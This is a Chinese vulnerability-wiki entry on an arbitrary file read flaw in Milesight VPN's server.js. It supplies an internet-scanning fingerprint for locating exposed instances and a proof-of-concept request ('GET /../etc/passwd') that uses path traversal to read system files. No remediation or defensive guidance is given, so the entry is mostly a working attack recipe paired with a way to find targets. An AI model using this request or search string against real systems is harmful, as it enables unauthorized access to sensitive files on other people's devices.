---
title: "Milesight VPN server.js 任意文件读取漏洞"
date: 2026-10-18 09:15:05
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Milesight-VPN"
tags:
  - "Milesight-VPN"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

MilesightVPN 是一款软件，可使 Milesight 产品的 VPN 通道设置过程更加简便，并可通过网络服务器界面监控连接状态。其中存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件

## 漏洞影响

Milesight VPN

## 网络测绘

```
"MilesightVPN"
```

## 漏洞复现

登陆页面

![image-20230828161340509](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828161340509.png)

验证POC

```
GET /../etc/passwd HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
```

![image-20230828161357209](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828161357209.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Milesight-VPN-server.js-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
